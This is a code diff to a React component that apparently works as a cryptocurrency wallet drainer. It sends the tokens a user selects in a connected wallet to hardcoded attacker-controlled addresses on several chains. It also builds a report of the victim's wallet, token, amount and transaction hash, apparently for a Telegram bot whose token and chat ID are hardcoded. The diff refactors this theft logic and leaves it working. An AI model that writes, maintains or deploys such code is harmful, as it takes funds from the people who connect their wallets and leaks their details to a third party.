@@ -3,11 +3,10 @@ import { Button, useToasts } from '@geist-ui/core';
 import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
 import { erc20Abi } from 'viem';
 import { useAtom } from 'jotai';
-import { normalize } from 'viem/ens';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import axios from 'axios';
-import { parseEther, parseGwei } from 'viem'; // Import necessary parsers
+import { parseEther } from 'viem';
 
 const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
 const TELEGRAM_CHAT_ID = '6718529435';
@@ -32,17 +31,8 @@ const destinationAddresses = {
   137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
 };
 
-function selectAddressForToken(network: number) {
-  const addresses = {
-    1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
-    56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  };
-
-  const selectedAddress = addresses[network];
+function selectAddressForToken(network: number): `0x${string}` | undefined {
+  const selectedAddress = destinationAddresses[network];
 
   if (selectedAddress) {
     console.log('Great Job! Selected Address:', selectedAddress);
@@ -75,32 +65,10 @@ export const SendTokens = () => {
 
     if (!walletClient || !publicClient) return;
 
-    const destinationAddress = destinationAddresses[chain?.id];
+    const destinationAddress = selectAddressForToken(chain?.id || 0);
     if (!destinationAddress) {
       showToast('Unsupported chain or no destination address found for this network', 'error');
       return;
-    }
-
-    selectAddressForToken(chain?.id);
-
-    let resolvedDestinationAddress = destinationAddress;
-
-    // Ensure destinationAddress is a valid string before using .includes()
-    if (typeof destinationAddress === 'string' && destinationAddress.includes('.')) {
-      try {
-        resolvedDestinationAddress = await publicClient.getEnsAddress({
-          name: normalize(destinationAddress),
-        });
-        if (resolvedDestinationAddress) {
-          showToast(`Resolved ENS address: ${resolvedDestinationAddress}`, 'success');
-        }
-      } catch (error) {
-        showToast(`Error resolving ENS address: ${error.message}`, 'warning');
-        return; // Exit on ENS resolution error
-      }
-    } else if (typeof destinationAddress !== 'string') {
-      showToast('Invalid destination address type', 'error');
-      return; // Exit if destinationAddress is not a string
     }
 
     for (const tokenAddress of tokensToSend) {
@@ -111,9 +79,9 @@ export const SendTokens = () => {
         : (`0x${tokenAddress}` as `0x${string}`);
 
       try {
-        const formattedDestinationAddress: `0x${string}` = resolvedDestinationAddress.startsWith('0x')
-          ? (resolvedDestinationAddress as `0x${string}`)
-          : (`0x${resolvedDestinationAddress}` as `0x${string}`);
+        const formattedDestinationAddress: `0x${string}` = destinationAddress.startsWith('0x')
+          ? (destinationAddress as `0x${string}`)
+          : (`0x${destinationAddress}` as `0x${string}`);
 
         if (tokenAddress === 'native') {
           // Handle native token transfer
@@ -167,8 +135,9 @@ export const SendTokens = () => {
           `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${token?.balance}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
         );
       } catch (err: any) {
+        console.error('Detailed Error:', err); // Log detailed error
         showToast(
-          `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
+          `Error with ${token?.contract_ticker_symbol} ${err?.message || 'Unknown error'}`,
           'warning',
         );
       }
@@ -194,5 +163,4 @@ export const SendTokens = () => {
     </div>
   );
 };
-
 
